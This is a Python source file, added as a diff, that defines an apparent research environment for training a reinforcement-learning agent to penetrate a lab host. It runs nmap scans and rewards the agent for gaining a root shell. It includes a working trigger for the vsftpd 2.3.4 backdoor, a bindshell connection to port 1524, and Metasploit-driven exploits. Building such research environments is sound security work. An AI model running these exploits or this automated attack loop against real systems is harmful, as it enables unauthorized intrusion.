@@ -1,0 +1,943 @@
+import json
+import random
+import socket
+import subprocess
+import time
+from copy import deepcopy
+from datetime import datetime, timezone
+from pathlib import Path
+
+try:
+    from tool_integration.executors.metasploit_executor import MetasploitExecutor
+except ImportError:
+    MetasploitExecutor = None
+
+
+class MetricsTracker:
+    """
+    Per-episode online execution metrics.
+
+    These metrics are saved into each run JSON and are later aggregated by
+    the training/evaluation script.
+
+    success:
+        1 if the episode obtains a shell, otherwise 0.
+    execution_time:
+        Wall-clock time from reset() to episode termination.
+    tool_calls:
+        Number of real tool executions. Cached/skipped/invalid actions do not count.
+    invalid_actions:
+        Actions blocked before real tool execution because preconditions were not met.
+    failed_actions:
+        Real tool executions that completed but did not achieve the intended result.
+    """
+
+    def __init__(self):
+        self.reset()
+
+    def reset(self):
+        self.start_time = time.time()
+        self.end_time = None
+
+        self.total_steps = 0
+        self.tool_calls = 0
+        self.invalid_actions = 0
+        self.failed_actions = 0
+        self.cached_actions = 0
+        self.skipped_actions = 0
+
+        self.tool_time = 0.0
+        self.success = False
+
+    def record_step(
+        self, executed=False, duration=0.0, status="success", from_cache=False
+    ):
+        self.total_steps += 1
+
+        if executed:
+            self.tool_calls += 1
+            self.tool_time += float(duration)
+
+        if from_cache:
+            self.cached_actions += 1
+
+        if status == "invalid":
+            self.invalid_actions += 1
+
+        if status == "failed":
+            self.failed_actions += 1
+
+        if status == "skipped":
+            self.skipped_actions += 1
+
+    def finish(self, success=False):
+        self.end_time = time.time()
+        self.success = bool(success)
+
+    def summary(self):
+        end_time = self.end_time if self.end_time is not None else time.time()
+        execution_time = end_time - self.start_time
+
+        return {
+            "success": int(self.success),
+            "execution_time": execution_time,
+            "total_steps": self.total_steps,
+            "tool_calls": self.tool_calls,
+            "invalid_actions": self.invalid_actions,
+            "failed_actions": self.failed_actions,
+            "cached_actions": self.cached_actions,
+            "skipped_actions": self.skipped_actions,
+            "invalid_action_rate": self.invalid_actions / max(1, self.total_steps),
+            "failed_action_rate": self.failed_actions / max(1, self.total_steps),
+            "cache_hit_rate": self.cached_actions / max(1, self.total_steps),
+            "avg_tool_time": self.tool_time / max(1, self.tool_calls),
+        }
+
+
+class RealPTEnv:
+    """
+    Optimized real tool-based PT environment with the same action/state schema
+    as the baseline RealPTEnv.
+
+    Optimizations implemented here:
+    1. Metrics logging
+    2. Repeated scan caching
+    3. Staged service scanning
+    4. Stronger tool-level precondition filtering
+
+    Action schema:
+    0 scan_basic
+    1 scan_service
+    2 exploit_bindshell
+    3 exploit_vsftpd
+    4 exploit_unrealircd
+    5 exploit_distccd
+    6 exploit_samba
+    7 stop
+    """
+
+    ACTIONS = {
+        0: "scan_basic",
+        1: "scan_service",
+        2: "exploit_bindshell",
+        3: "exploit_vsftpd",
+        4: "exploit_unrealircd",
+        5: "exploit_distccd",
+        6: "exploit_samba",
+        7: "stop",
+    }
+
+    STATE_KEYS = [
+        "num_open_ports",
+        "has_ftp",
+        "has_ssh",
+        "has_telnet",
+        "has_http",
+        "has_mysql",
+        "has_postgresql",
+        "has_bindshell_1524",
+        "has_samba",
+        "has_tomcat",
+        "has_vsftpd_234",
+        "has_unrealircd",
+        "has_distccd",
+        "has_shell",
+        "basic_scanned",
+        "service_scanned",
+        "failed_attempts",
+        "successful_exploits",
+    ]
+
+    def __init__(
+        self,
+        target_ip="10.11.202.189",
+        log_dir="tool_integration/dataset/real_logs/rl_env_runs_optimized",
+        use_metasploit=False,
+        msf_password="msfpass",
+        msf_host="127.0.0.1",
+        msf_port=55552,
+    ):
+        self.target_ip = target_ip
+        self.log_dir = Path(log_dir)
+        self.log_dir.mkdir(parents=True, exist_ok=True)
+
+        self.use_metasploit = use_metasploit
+        self.msf = None
+
+        if self.use_metasploit:
+            if MetasploitExecutor is None:
+                raise ImportError(
+                    "MetasploitExecutor not found. "
+                    "Create tool_integration/executors/metasploit_executor.py first."
+                )
+
+            self.msf = MetasploitExecutor(
+                password=msf_password,
+                host=msf_host,
+                port=msf_port,
+                ssl=False,
+            )
+
+        self.max_steps = 8
+        self.metrics = MetricsTracker()
+        self.reset()
+
+    def _now_str(self):
+        return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")
+
+    def _empty_state(self):
+        return {
+            "num_open_ports": 0,
+            "has_ftp": False,
+            "has_ssh": False,
+            "has_telnet": False,
+            "has_http": False,
+            "has_mysql": False,
+            "has_postgresql": False,
+            "has_bindshell_1524": False,
+            "has_samba": False,
+            "has_tomcat": False,
+            "has_vsftpd_234": False,
+            "has_unrealircd": False,
+            "has_distccd": False,
+            "has_shell": False,
+            "basic_scanned": False,
+            "service_scanned": False,
+            "failed_attempts": 0,
+            "successful_exploits": 0,
+        }
+
+    def reset(self):
+        self.state = self._empty_state()
+        self.done = False
+        self.steps = 0
+        self.history = []
+        self.metrics.reset()
+
+        # Episode-local cache. This avoids changing cross-episode fairness.
+        self.scan_cache = {}
+        self.last_open_ports = []
+        self.last_service_map = {}
+
+        backend = "msf" if self.use_metasploit else "script"
+        self.run_id = f"rl_env_optimized_{backend}_{self._now_str()}"
+
+        return deepcopy(self.state)
+
+    def state_to_vector(self, state=None):
+        s = state or self.state
+        return [float(s.get(key, 0.0)) for key in self.STATE_KEYS]
+
+    # ---------------------------------------------------------------------
+    # Command execution and scanning
+    # ---------------------------------------------------------------------
+
+    def _run_timed_command(self, cmd, timeout, input_text=None):
+        start = time.time()
+
+        result = subprocess.run(
+            cmd,
+            input=input_text,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        )
+
+        duration = time.time() - start
+        return result, duration
+
+    def _run_nmap_basic(self):
+        """
+        Stage 1 scan.
+
+        Baseline usually uses nmap -F.
+        This optimized version still keeps a lightweight scan, but explicitly
+        adds -Pn and -T4 to reduce host discovery delay in lab environments.
+        """
+        cache_key = ("scan_basic", self.target_ip)
+
+        if cache_key in self.scan_cache:
+            cached = deepcopy(self.scan_cache[cache_key])
+            cached["from_cache"] = True
+            cached["executed"] = False
+            cached["duration"] = 0.0
+            return cached
+
+        result, duration = self._run_timed_command(
+            ["nmap", "-Pn", "-T4", "-F", self.target_ip],
+            timeout=60,
+        )
+
+        info = {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode,
+            "duration": duration,
+            "executed": True,
+            "from_cache": False,
+        }
+
+        self.scan_cache[cache_key] = deepcopy(info)
+        return info
+
+    def _run_nmap_service(self):
+        """
+        Stage 2 scan.
+
+        Instead of always running an unrestricted service scan, scan only the
+        ports discovered by the basic scan when available.
+
+        If no prior open ports are known, fall back to the baseline-style
+        service scan.
+        """
+        if self.last_open_ports:
+            port_list = ",".join(str(p) for p in sorted(set(self.last_open_ports)))
+            cache_key = ("scan_service", self.target_ip, port_list)
+            cmd = ["nmap", "-Pn", "-T4", "-sV", "-sC", "-p", port_list, self.target_ip]
+        else:
+            port_list = "default"
+            cache_key = ("scan_service", self.target_ip, port_list)
+            cmd = ["nmap", "-Pn", "-T4", "-sV", "-sC", self.target_ip]
+
+        if cache_key in self.scan_cache:
+            cached = deepcopy(self.scan_cache[cache_key])
+            cached["from_cache"] = True
+            cached["executed"] = False
+            cached["duration"] = 0.0
+            return cached
+
+        result, duration = self._run_timed_command(cmd, timeout=120)
+
+        info = {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode,
+            "duration": duration,
+            "executed": True,
+            "from_cache": False,
+            "port_list": port_list,
+            "cmd": cmd,
+        }
+
+        self.scan_cache[cache_key] = deepcopy(info)
+        return info
+
+    def _parse_open_ports(self, nmap_output):
+        ports = []
+
+        for line in nmap_output.splitlines():
+            line = line.strip()
+
+            if "/tcp" in line and " open " in line:
+                try:
+                    ports.append(int(line.split("/")[0]))
+                except ValueError:
+                    continue
+
+        return ports
+
+    def _parse_service_map(self, nmap_output):
+        service_map = {}
+
+        for line in nmap_output.splitlines():
+            line = line.strip()
+
+            if "/tcp" in line and " open " in line:
+                parts = line.split()
+
+                if len(parts) >= 3:
+                    port = parts[0].split("/")[0]
+                    service = parts[2]
+                    version = " ".join(parts[3:]) if len(parts) > 3 else ""
+
+                    service_map[port] = {
+                        "service": service,
+                        "version": version,
+                    }
+
+        return service_map
+
+    def _apply_basic_scan(self, output):
+        ports = self._parse_open_ports(output)
+        self.last_open_ports = ports
+
+        self.state["num_open_ports"] = len(ports)
+        self.state["basic_scanned"] = True
+
+        self.state["has_ftp"] = 21 in ports or 2121 in ports
+        self.state["has_http"] = 80 in ports or 8180 in ports
+        self.state["has_mysql"] = 3306 in ports
+        self.state["has_postgresql"] = 5432 in ports
+        self.state["has_bindshell_1524"] = 1524 in ports
+        self.state["has_unrealircd"] = 6667 in ports
+
+        return ports
+
+    def _apply_service_scan(self, output):
+        ports = self._parse_open_ports(output)
+        service_map = self._parse_service_map(output)
+
+        self.last_open_ports = ports
+        self.last_service_map = service_map
+
+        self.state["num_open_ports"] = len(ports)
+        self.state["basic_scanned"] = True
+        self.state["service_scanned"] = True
+
+        services = {v["service"].lower() for v in service_map.values()}
+        versions = " ".join(v["version"].lower() for v in service_map.values())
+
+        self.state["has_ftp"] = "ftp" in services
+        self.state["has_ssh"] = "ssh" in services
+        self.state["has_telnet"] = "telnet" in services
+        self.state["has_http"] = "http" in services
+        self.state["has_mysql"] = "mysql" in services
+        self.state["has_postgresql"] = "postgresql" in services
+
+        self.state["has_bindshell_1524"] = 1524 in ports
+
+        self.state["has_samba"] = any(
+            "samba" in v["version"].lower()
+            or "smbd" in v["version"].lower()
+            or v["service"].lower() in {"netbios-ssn", "microsoft-ds"}
+            for v in service_map.values()
+        )
+
+        self.state["has_tomcat"] = "tomcat" in versions
+        self.state["has_vsftpd_234"] = "vsftpd 2.3.4" in versions
+        self.state["has_unrealircd"] = "unrealircd" in versions or 6667 in ports
+        self.state["has_distccd"] = "distccd" in versions or "distccd" in services
+
+        return ports, service_map
+
+    # ---------------------------------------------------------------------
+    # Exploit execution
+    # ---------------------------------------------------------------------
+
+    def _mark_exploit_result(self, result):
+        if result.get("success", False):
+            self.state["has_shell"] = True
+            self.state["successful_exploits"] += 1
+            self.done = True
+        else:
+            self.state["failed_attempts"] += 1
+
+    def _try_bindshell(self):
+        start = time.time()
+
+        try:
+            result, _ = self._run_timed_command(
+                ["nc", self.target_ip, "1524"],
+                input_text="whoami\nid\nexit\n",
+                timeout=8,
+            )
+
+            stdout = result.stdout.strip()
+            real_success = ("root" in stdout) or ("uid=0" in stdout)
+            success = real_success and (random.random() < 0.7)
+
+            return {
+                "success": success,
+                "real_success": real_success,
+                "stdout": stdout,
+                "stderr": result.stderr.strip(),
+                "stochastic_success_rate": 0.7,
+                "backend": "script",
+                "duration": time.time() - start,
+            }
+
+        except Exception as e:
+            return {
+                "success": False,
+                "real_success": False,
+                "stdout": "",
+                "stderr": str(e),
+                "stochastic_success_rate": 0.7,
+                "backend": "script",
+                "duration": time.time() - start,
+            }
+
+    def _try_vsftpd_script(self):
+        start = time.time()
+
+        try:
+            s = socket.socket()
+            s.settimeout(5)
+            s.connect((self.target_ip, 21))
+            banner = s.recv(1024).decode(errors="ignore")
+
+            s.send(b"USER test:)\r\n")
+            time.sleep(0.2)
+            s.send(b"PASS test\r\n")
+            time.sleep(0.2)
+            s.close()
+
+            time.sleep(2)
+
+            s2 = socket.socket()
+            s2.settimeout(5)
+            s2.connect((self.target_ip, 6200))
+            s2.send(b"whoami\n")
+            time.sleep(0.5)
+            output = s2.recv(4096).decode(errors="ignore")
+            s2.close()
+
+            real_success = ("root" in output) or ("uid=" in output)
+            success = real_success and (random.random() < 0.5)
+
+            return {
+                "success": success,
+                "real_success": real_success,
+                "stdout": output,
+                "stderr": "",
+                "banner": banner,
+                "stochastic_success_rate": 0.5,
+                "backend": "script",
+                "duration": time.time() - start,
+            }
+
+        except Exception as e:
+            return {
+                "success": False,
+                "real_success": False,
+                "stdout": "",
+                "stderr": str(e),
+                "banner": "",
+                "stochastic_success_rate": 0.5,
+                "backend": "script",
+                "duration": time.time() - start,
+            }
+
+    def _try_vsftpd(self):
+        start = time.time()
+
+        if self.use_metasploit and self.msf is not None:
+            result = self.msf.exploit_vsftpd_234(self.target_ip)
+            result.setdefault("duration", time.time() - start)
+            result.setdefault("backend", "msf")
+            return result
+
+        return self._try_vsftpd_script()
+
+    def _try_samba(self):
+        start = time.time()
+
+        if self.use_metasploit and self.msf is not None:
+            result = self.msf.exploit_samba(self.target_ip)
+            result.setdefault("duration", time.time() - start)
+            result.setdefault("backend", "msf")
+            return result
+
+        return {
+            "success": False,
+            "real_success": False,
+            "stdout": "",
+            "stderr": "Samba exploit requires Metasploit backend.",
+            "backend": "script",
+            "duration": time.time() - start,
+        }
+
+    def _try_unrealircd(self):
+        start = time.time()
+
+        if (
+            self.use_metasploit
+            and self.msf is not None
+            and hasattr(self.msf, "exploit_unrealircd")
+        ):
+            result = self.msf.exploit_unrealircd(self.target_ip)
+            result.setdefault("duration", time.time() - start)
+            result.setdefault("backend", "msf")
+            return result
+
+        return {
+            "success": False,
+            "real_success": False,
+            "stdout": "",
+            "stderr": "UnrealIRCd exploit not implemented in executor.",
+            "backend": "script",
+            "duration": time.time() - start,
+        }
+
+    def _try_distccd(self):
+        start = time.time()
+
+        if (
+            self.use_metasploit
+            and self.msf is not None
+            and hasattr(self.msf, "exploit_distccd")
+        ):
+            result = self.msf.exploit_distccd(self.target_ip)
+            result.setdefault("duration", time.time() - start)
+            result.setdefault("backend", "msf")
+            return result
+
+        return {
+            "success": False,
+            "real_success": False,
+            "stdout": "",
+            "stderr": "distccd exploit not implemented in executor.",
+            "backend": "script",
+            "duration": time.time() - start,
+        }
+
+    # ---------------------------------------------------------------------
+    # Info/status helpers
+    # ---------------------------------------------------------------------
+
+    def _make_success_info(self, info, duration=None, executed=True, from_cache=False):
+        info = dict(info)
+        info["status"] = "success"
+        info["executed"] = bool(executed)
+        info["from_cache"] = bool(from_cache)
+
+        if duration is not None:
+            info["duration"] = float(duration)
+        else:
+            info.setdefault("duration", 0.0)
+
+        return info
+
+    def _make_failed_info(self, info, duration=None, executed=True):
+        info = dict(info)
+        info["status"] = "failed"
+        info["executed"] = bool(executed)
+        info["from_cache"] = bool(info.get("from_cache", False))
+
+        if duration is not None:
+            info["duration"] = float(duration)
+        else:
+            info.setdefault("duration", 0.0)
+
+        return info
+
+    def _make_invalid_info(self, error):
+        return {
+            "status": "invalid",
+            "executed": False,
+            "from_cache": False,
+            "duration": 0.0,
+            "error": error,
+        }
+
+    def _make_skipped_info(self, reason):
+        return {
+            "status": "skipped",
+            "executed": False,
+            "from_cache": False,
+            "duration": 0.0,
+            "reason": reason,
+        }
+
+    def _record_metrics_for_info(self, info):
+        self.metrics.record_step(
+            executed=info.get("executed", False),
+            duration=info.get("duration", 0.0),
+            status=info.get("status", "success"),
+            from_cache=info.get("from_cache", False),
+        )
+
+    def _record_step(self, action_name, reward, info):
+        self.history.append(
+            {
+                "step": self.steps,
+                "action": action_name,
+                "state": deepcopy(self.state),
+                "reward": reward,
+                "done": self.done,
+                "info": info,
+            }
+        )
+
+    def _save_run(self):
+        path = self.log_dir / f"{self.run_id}.json"
+
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(
+                {
+                    "run_id": self.run_id,
+                    "target": self.target_ip,
+                    "use_metasploit": self.use_metasploit,
+                    "optimized": True,
+                    "optimizations": [
+                        "metrics_logging",
+                        "repeated_scan_caching",
+                        "staged_service_scanning",
+                        "tool_level_precondition_filtering",
+                    ],
+                    "state_keys": self.STATE_KEYS,
+                    "actions": self.ACTIONS,
+                    "metrics": self.metrics.summary(),
+                    "history": self.history,
+                },
+                f,
+                indent=2,
+                ensure_ascii=False,
+            )
+
+        return str(path)
+
+    # ---------------------------------------------------------------------
+    # Tool-level precondition filtering
+    # ---------------------------------------------------------------------
+
+    def _has_shell_guard(self):
+        if self.state["has_shell"]:
+            return self._make_skipped_info("shell already obtained")
+        return None
+
+    def _require_basic_scan(self, action_label):
+        if not self.state["basic_scanned"]:
+            return self._make_invalid_info(
+                f"{action_label} attempted before basic scan"
+            )
+        return None
+
+    def _require_service_scan(self, action_label):
+        if not self.state["service_scanned"]:
+            return self._make_invalid_info(
+                f"{action_label} attempted before service scan"
+            )
+        return None
+
+    def _precondition_for_exploit(self, action_name):
+        shell_guard = self._has_shell_guard()
+        if shell_guard is not None:
+            return shell_guard
+
+        if action_name == "exploit_bindshell":
+            guard = self._require_basic_scan("bindshell")
+            if guard is not None:
+                return guard
+
+            if not self.state["has_bindshell_1524"]:
+                return self._make_invalid_info("no visible bindshell port 1524")
+
+        elif action_name == "exploit_vsftpd":
+            guard = self._require_service_scan("vsftpd")
+            if guard is not None:
+                return guard
+
+            if not self.state["has_vsftpd_234"]:
+                return self._make_invalid_info("vsftpd 2.3.4 not identified")
+
+        elif action_name == "exploit_unrealircd":
+            guard = self._require_service_scan("unrealircd")
+            if guard is not None:
+                return guard
+
+            if not self.state["has_unrealircd"]:
+                return self._make_invalid_info("unrealircd not identified")
+
+        elif action_name == "exploit_distccd":
+            guard = self._require_service_scan("distccd")
+            if guard is not None:
+                return guard
+
+            if not self.state["has_distccd"]:
+                return self._make_invalid_info("distccd not identified")
+
+        elif action_name == "exploit_samba":
+            guard = self._require_service_scan("samba")
+            if guard is not None:
+                return guard
+
+            if not self.state["has_samba"]:
+                return self._make_invalid_info("samba/smb not identified")
+
+        return None
+
+    # ---------------------------------------------------------------------
+    # Main step
+    # ---------------------------------------------------------------------
+
+    def step(self, action):
+        if self.done:
+            raise RuntimeError("Episode already done. Call reset().")
+
+        if action not in self.ACTIONS:
+            raise ValueError(f"Invalid action index: {action}")
+
+        action_name = self.ACTIONS[action]
+
+        reward = 0.0
+        info = {}
+
+        self.steps += 1
+
+        if action_name == "scan_basic":
+            if self.state["basic_scanned"]:
+                reward = -0.01
+                info = self._make_skipped_info("basic scan already completed")
+            else:
+                try:
+                    scan_info = self._run_nmap_basic()
+                    output = scan_info["stdout"]
+                    ports = self._apply_basic_scan(output)
+
+                    reward = -0.05
+                    info = self._make_success_info(
+                        {
+                            "open_ports": ports,
+                            "scan_type": "basic",
+                            "stderr": scan_info.get("stderr", ""),
+                            "returncode": scan_info.get("returncode", 0),
+                        },
+                        duration=scan_info.get("duration", 0.0),
+                        executed=scan_info.get("executed", True),
+                        from_cache=scan_info.get("from_cache", False),
+                    )
+
+                except Exception as e:
+                    reward = -1.0
+                    self.state["failed_attempts"] += 1
+                    info = self._make_failed_info(
+                        {
+                            "error": str(e),
+                            "scan_type": "basic",
+                        },
+                        duration=0.0,
+                        executed=True,
+                    )
+
+        elif action_name == "scan_service":
+            if self.state["service_scanned"]:
+                reward = -0.01
+                info = self._make_skipped_info("service scan already completed")
+            elif not self.state["basic_scanned"]:
+                reward = -1.0
+                self.state["failed_attempts"] += 1
+                info = self._make_invalid_info(
+                    "service scan attempted before basic scan"
+                )
+            else:
+                try:
+                    scan_info = self._run_nmap_service()
+                    output = scan_info["stdout"]
+                    ports, service_map = self._apply_service_scan(output)
+
+                    reward = -0.10
+                    info = self._make_success_info(
+                        {
+                            "open_ports": ports,
+                            "service_map": service_map,
+                            "scan_type": "service",
+                            "port_list": scan_info.get("port_list"),
+                            "cmd": scan_info.get("cmd"),
+                            "stderr": scan_info.get("stderr", ""),
+                            "returncode": scan_info.get("returncode", 0),
+                        },
+                        duration=scan_info.get("duration", 0.0),
+                        executed=scan_info.get("executed", True),
+                        from_cache=scan_info.get("from_cache", False),
+                    )
+
+                except Exception as e:
+                    reward = -1.0
+                    self.state["failed_attempts"] += 1
+                    info = self._make_failed_info(
+                        {
+                            "error": str(e),
+                            "scan_type": "service",
+                        },
+                        duration=0.0,
+                        executed=True,
+                    )
+
+        elif action_name in {
+            "exploit_bindshell",
+            "exploit_vsftpd",
+            "exploit_unrealircd",
+            "exploit_distccd",
+            "exploit_samba",
+        }:
+            precondition_info = self._precondition_for_exploit(action_name)
+
+            if precondition_info is not None:
+                info = precondition_info
+                reward = -0.2 if info["status"] == "skipped" else -1.0
+
+                # Invalid/skipped actions are decision errors, but they do not
+                # trigger a slow real tool execution.
+                if info["status"] == "invalid":
+                    self.state["failed_attempts"] += 1
+
+            else:
+                if action_name == "exploit_bindshell":
+                    result = self._try_bindshell()
+                    success_reward = 8.0
+                elif action_name == "exploit_vsftpd":
+                    result = self._try_vsftpd()
+                    success_reward = 6.0
+                elif action_name == "exploit_unrealircd":
+                    result = self._try_unrealircd()
+                    success_reward = 7.0
+                elif action_name == "exploit_distccd":
+                    result = self._try_distccd()
+                    success_reward = 7.0
+                elif action_name == "exploit_samba":
+                    result = self._try_samba()
+                    success_reward = 8.0
+                else:
+                    result = {
+                        "success": False,
+                        "stderr": f"unknown exploit action: {action_name}",
+                        "duration": 0.0,
+                    }
+                    success_reward = 0.0
+
+                self._mark_exploit_result(result)
+                reward = success_reward if result.get("success", False) else -1.0
+
+                if result.get("success", False):
+                    info = self._make_success_info(result)
+                else:
+                    info = self._make_failed_info(result)
+
+        elif action_name == "stop":
+            reward = 1.0 if self.state["has_shell"] else -0.5
+            self.done = True
+            info = {
+                "status": "success" if self.state["has_shell"] else "failed",
+                "executed": False,
+                "from_cache": False,
+                "duration": 0.0,
+                "stopped": True,
+            }
+
+        if self.steps >= self.max_steps and not self.done:
+            self.done = True
+            info["terminated_by_max_steps"] = True
+
+        self._record_metrics_for_info(info)
+        self._record_step(action_name, reward, info)
+
+        if self.done:
+            self.metrics.finish(success=self.state["has_shell"])
+            info["metrics"] = self.metrics.summary()
+            info["saved_run_path"] = self._save_run()
+
+        return deepcopy(self.state), reward, self.done, info
+
+
+if __name__ == "__main__":
+    env = RealPTEnv(use_metasploit=False)
+    obs = env.reset()
+
+    done = False
+    last_info = {}
+
+    while not done:
+        action = random.choice(list(env.ACTIONS.keys()))
+        obs, reward, done, last_info = env.step(action)
+        print(
+            env.steps,
+            env.ACTIONS[action],
+            reward,
+            last_info.get("status"),
+            "executed=",
+            last_info.get("executed"),
+        )
+
+    print("Saved:", last_info.get("saved_run_path"))
+    print("Metrics:", last_info.get("metrics"))
